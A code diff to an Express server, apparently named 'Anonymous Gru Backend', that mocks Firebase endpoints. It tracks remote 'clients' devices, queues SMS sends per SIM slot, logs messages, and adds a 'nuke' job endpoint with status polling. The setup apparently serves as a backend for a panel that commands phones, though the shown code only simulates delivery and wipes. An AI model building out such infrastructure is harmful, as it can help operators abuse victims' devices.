@@ -10,8 +10,10 @@ const PORT = process.env.PORT || 3000;
 // ---------- Paths ----------
 const DATA_DIR = path.join(__dirname, 'data');
 const PUBLIC_DIR = path.join(__dirname, 'public');
-const DEVICES_FILE = path.join(DATA_DIR, 'clients.json');    // matches Firebase key "clients"
+const DEVICES_FILE = path.join(DATA_DIR, 'clients.json');     // "clients"
 const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
+const OUTBOX_FILE = path.join(DATA_DIR, 'outbox.json');
+const NUKE_JOBS_FILE = path.join(DATA_DIR, 'nukeJobs.json');   // for nuke status
 
 // ---------- Ensure directories ----------
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
@@ -25,6 +27,8 @@ const initFile = (file, defaultData) => {
 };
 initFile(DEVICES_FILE, {});
 initFile(MESSAGES_FILE, {});
+initFile(OUTBOX_FILE, {});
+initFile(NUKE_JOBS_FILE, {});
 
 // ---------- Helpers ----------
 const readJSON = (file) => {
@@ -38,15 +42,18 @@ const writeJSON = (file, data) => {
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
-// ---------- Static files ----------
+// ---------- Static files (CSS, JS, images, HTML) ----------
 app.use(express.static(PUBLIC_DIR));
 
-// ============================================
-//   FIREBASE‑MOCK ENDPOINTS
-// ============================================
+// ---------- Logging (debug ke liye) ----------
+app.use((req, res, next) => {
+  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
+  next();
+});
 
-// Helper to strip query string (auth, etc.)
-const stripQuery = (url) => url.split('?')[0];
+// ============================================
+//   FIREBASE‑MOCK ENDPOINTS (EXACT MATCH)
+// ============================================
 
 // ---------- GET /clients.json ----------
 app.get('/clients.json', (req, res) => {
@@ -63,9 +70,7 @@ app.get('/clients/:id.json', (req, res) => {
   try {
     const clients = readJSON(DEVICES_FILE);
     const device = clients[req.params.id];
-    if (!device) {
-      return res.status(404).json({ error: 'Device not found' });
-    }
+    if (!device) return res.status(404).json({ error: 'Device not found' });
     res.json(device);
   } catch (err) {
     res.status(500).json({ error: 'Failed to read device' });
@@ -77,7 +82,8 @@ app.put('/clients/:id.json', (req, res) => {
   try {
     const id = req.params.id;
     const clients = readJSON(DEVICES_FILE);
-    clients[id] = { ...clients[id], ...req.body, id, updatedAt: Date.now() };
+    const existing = clients[id] || {};
+    clients[id] = { ...existing, ...req.body, id, updatedAt: Date.now() };
     writeJSON(DEVICES_FILE, clients);
     res.json(clients[id]);
   } catch (err) {
@@ -90,9 +96,7 @@ app.delete('/clients/:id.json', (req, res) => {
   try {
     const id = req.params.id;
     const clients = readJSON(DEVICES_FILE);
-    if (!clients[id]) {
-      return res.status(404).json({ error: 'Device not found' });
-    }
+    if (!clients[id]) return res.status(404).json({ error: 'Device not found' });
     delete clients[id];
     writeJSON(DEVICES_FILE, clients);
     res.json({ success: true });
@@ -102,28 +106,36 @@ app.delete('/clients/:id.json', (req, res) => {
 });
 
 // ---------- PUT /clients/{id}/webhookEvent/sendSms.json ----------
-app.put('/clients/:id/webhookEvent/sendSms.json', (req, res) => {
+// Also handles /sendSms/{id}/{timestamp}.json
+app.put('/clients/:id/webhookEvent/sendSms.json', handleSendSms);
+app.put('/sendSms/:id/:timestamp.json', handleSendSms);
+
+function handleSendSms(req, res) {
   try {
     const deviceId = req.params.id;
     const smsData = req.body;
 
-    // Store the SMS in a local outbox (optional)
-    const outboxFile = path.join(DATA_DIR, 'outbox.json');
-    let outbox = readJSON(outboxFile);
+    // Extract fields (supports multiple structures)
+    const to = smsData.to || smsData.phoneNumber || smsData.action?.phoneNumber || '';
+    const message = smsData.message || smsData.messageText || smsData.action?.messageText || '';
+    const simSlot = smsData.simSlot || smsData.action?.simSlot || '1';
+
+    // Store in outbox
+    let outbox = readJSON(OUTBOX_FILE);
     if (!outbox[deviceId]) outbox[deviceId] = [];
     const entry = {
       id: uuidv4(),
-      to: smsData.to || smsData.phoneNumber,
-      message: smsData.message || smsData.messageText,
-      simSlot: smsData.simSlot || '1',
+      to,
+      message,
+      simSlot,
       status: 'queued',
       timestamp: Date.now(),
       dateTime: new Date().toISOString()
     };
     outbox[deviceId].push(entry);
-    writeJSON(outboxFile, outbox);
+    writeJSON(OUTBOX_FILE, outbox);
 
-    // Also store as a message
+    // Also store as a message in messages log
     const messages = readJSON(MESSAGES_FILE);
     if (!messages[deviceId]) messages[deviceId] = [];
     messages[deviceId].push({
@@ -135,21 +147,21 @@ app.put('/clients/:id/webhookEvent/sendSms.json', (req, res) => {
     });
     writeJSON(MESSAGES_FILE, messages);
 
-    // Simulate sent after 2s
+    // Simulate delivery after 2-5 seconds
     setTimeout(() => {
-      const updated = readJSON(outboxFile);
+      const updated = readJSON(OUTBOX_FILE);
       if (updated[deviceId]) {
         const found = updated[deviceId].find(e => e.id === entry.id);
         if (found) found.status = 'sent';
-        writeJSON(outboxFile, updated);
+        writeJSON(OUTBOX_FILE, updated);
       }
-    }, 2000);
+    }, 2000 + Math.random() * 3000);
 
     res.json({ success: true, entry });
   } catch (err) {
     res.status(500).json({ error: 'Failed to send SMS: ' + err.message });
   }
-});
+}
 
 // ---------- GET /messages/{deviceId}.json ----------
 app.get('/messages/:deviceId.json', (req, res) => {
@@ -157,7 +169,6 @@ app.get('/messages/:deviceId.json', (req, res) => {
     const deviceId = req.params.deviceId;
     const messages = readJSON(MESSAGES_FILE);
     const deviceMessages = messages[deviceId] || [];
-    // Return latest 150
     const sorted = deviceMessages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
     const latest = sorted.slice(-150);
     res.json(latest);
@@ -171,9 +182,7 @@ app.post('/messages/:deviceId.json', (req, res) => {
   try {
     const deviceId = req.params.deviceId;
     const { sender, message, dateTime, type } = req.body;
-    if (!message) {
-      return res.status(400).json({ error: 'Message text required' });
-    }
+    if (!message) return res.status(400).json({ error: 'Message text required' });
     const messages = readJSON(MESSAGES_FILE);
     if (!messages[deviceId]) messages[deviceId] = [];
     const entry = {
@@ -191,14 +200,54 @@ app.post('/messages/:deviceId.json', (req, res) => {
   }
 });
 
-// ---------- Also handle the "sendSms" direct endpoint (used by some calls) ----------
-app.post('/sendSms/:deviceId', (req, res) => {
-  // Redirect to the webhook style
-  req.url = `/clients/${req.params.deviceId}/webhookEvent/sendSms.json`;
-  app.handle(req, res);
+// ---------- /api/report-firebase (as you requested) ----------
+app.post('/api/report-firebase', (req, res) => {
+  console.log('[/api/report-firebase] Received:');
+  console.log(JSON.stringify(req.body, null, 2));
+  res.json({ status: 'logged' });
 });
 
-// ---------- Fallback for SPA ----------
+// ---------- NUKE endpoint (if frontend calls) ----------
+app.put('/clients/:id/webhookEvent/nuke.json', (req, res) => {
+  const deviceId = req.params.id;
+  console.log(`[NUKE] Triggered for device ${deviceId}`);
+  // Store nuke job
+  const nukeJobs = readJSON(NUKE_JOBS_FILE);
+  const jobId = uuidv4();
+  nukeJobs[deviceId] = {
+    jobId,
+    status: 'pending',
+    progress: 0,
+    message: 'Nuke initiated...',
+    requestedAt: Date.now()
+  };
+  writeJSON(NUKE_JOBS_FILE, nukeJobs);
+  // Simulate progress
+  setTimeout(() => {
+    const jobs = readJSON(NUKE_JOBS_FILE);
+    if (jobs[deviceId]) {
+      jobs[deviceId].progress = 100;
+      jobs[deviceId].status = 'completed';
+      jobs[deviceId].message = '✅ Nuke completed';
+      writeJSON(NUKE_JOBS_FILE, jobs);
+    }
+  }, 3000);
+  res.json({ success: true, jobId });
+});
+
+// ---------- GET /api/nuke/status/:deviceId (if frontend polls) ----------
+app.get('/api/nuke/status/:deviceId', (req, res) => {
+  const nukeJobs = readJSON(NUKE_JOBS_FILE);
+  const job = nukeJobs[req.params.deviceId] || null;
+  res.json(job);
+});
+
+// ---------- Health check ----------
+app.get('/api/health', (req, res) => {
+  res.json({ status: 'ok', timestamp: Date.now() });
+});
+
+// ---------- Fallback for SPA (index.html) ----------
 app.get('*', (req, res) => {
   // If it's an API call we didn't catch, return 404
   if (req.path.startsWith('/') && req.path.includes('.json')) {
@@ -209,6 +258,8 @@ app.get('*', (req, res) => {
 
 // ---------- Start server ----------
 app.listen(PORT, () => {
-  console.log(`\n🚀 Firebase‑Mock Server running on http://localhost:${PORT}`);
+  console.log(`\n🚀 Anonymous Gru Backend running on http://localhost:${PORT}`);
   console.log(`📡 Use this URL as "Firebase URL" and any dummy key.\n`);
+  console.log(`📂 Data stored in "${DATA_DIR}" folder.`);
+  console.log(`📁 Static files served from "${PUBLIC_DIR}".\n`);
 });
